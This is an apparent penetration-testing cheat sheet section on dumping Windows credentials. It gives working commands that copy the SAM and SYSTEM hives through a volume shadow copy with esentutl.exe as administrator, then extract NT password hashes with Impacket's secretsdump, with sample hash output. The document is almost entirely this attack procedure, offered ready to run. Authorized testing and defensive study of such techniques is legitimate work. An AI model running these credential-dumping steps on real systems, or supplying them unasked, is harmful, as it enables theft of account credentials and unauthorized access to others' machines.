# Attacking Windows

- [Credentials Access & Dumping](#credentials-access&dumping)
    - [Dumping SAM & SYSTEM](#dumping-sam&system)
        


## Credentials Access & Dumping

### Dumping SAM & SYSTEM

*   **[esentutl.exe](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875546(v=ws.11))**
    
    **Requirements:**
    -   Run cmd.exe or PowerShell as Admin

    ```powershell
    # Dump SAM
    esentutl.exe /y /vss C:\Windows\system32\config\SAM /d c:\temp\sam
    # Dump SYSTEM
    esentutl.exe /y /vss C:\Windows\system32\config\SYSTEM /d c:\temp\system
    ```

    **Read out SAM & SYSTEM:**
    ```powershell
    # Use Impackets secretsdump or samdump2
    /usr/bin/impacket-secretsdump -sam sam -system system LOCAL

    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Gast:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
            
    # Note: 31d6cfe0d16ae931b73c59d7e0c089c0 means account is disabled or no password is set
    ```
